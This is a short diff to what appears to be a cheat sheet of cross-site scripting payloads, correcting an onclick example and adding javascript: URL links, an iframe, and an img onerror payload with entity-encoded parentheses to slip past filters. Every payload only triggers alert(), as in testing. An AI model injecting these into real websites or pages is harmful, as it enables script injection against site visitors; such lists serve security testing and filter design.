@@ -18,11 +18,21 @@ Or encoded version:
 
 4. Using an Event Handler: 
 
-<a href="#" onclick="alert("XSS")">Click me!</a> 
+<a href="#" onclick="alert(1)">Click me!</a> 
+
+<a href="javascript:alert(1)">Click me</a>
+
 
 5. Advanced Payload (using IIFE): 
 
 <script>(()=>{alert('XSS')})()</script> 
+
+<img src="x" onerror="alert&#40;'XSS'&#41;">
+
+<iframe src="javascript:alert(1)"></iframe>
+
+<a href="javascript:alert(1)">Click me</a>
+
 
 ----
 
